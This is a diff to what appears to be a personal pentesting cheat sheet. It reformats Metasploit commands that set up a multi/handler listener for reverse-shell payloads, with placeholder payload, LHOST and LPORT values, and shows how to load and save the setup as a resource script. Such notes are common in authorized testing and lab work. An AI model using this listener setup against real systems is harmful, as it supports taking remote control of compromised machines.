@@ -83,18 +83,27 @@ set payload <payload>
 set LHOST <ip>
 set LPORT <port>
 exploit
-```
-```
-vi handler.rc
 
+vi handler.rc
 use multi/handler
 set PAYLOAD <payload>
 set LHOST <ip>
 set LPORT <port>
 exploit
-```
-```
+
 msfconsole -r handler.rc
+```
+```
+msf6 > resource handler.rc
+```
+```
+msf6 > use multi/handler
+msf6 > set PAYLOAD <payload>
+msf6 > set LHOST <ip>
+msf6 > set LPORT <port>
+msf6 > exploit
+^C
+msf6 > makerc handler.rc
 ```
 
 ## tmux
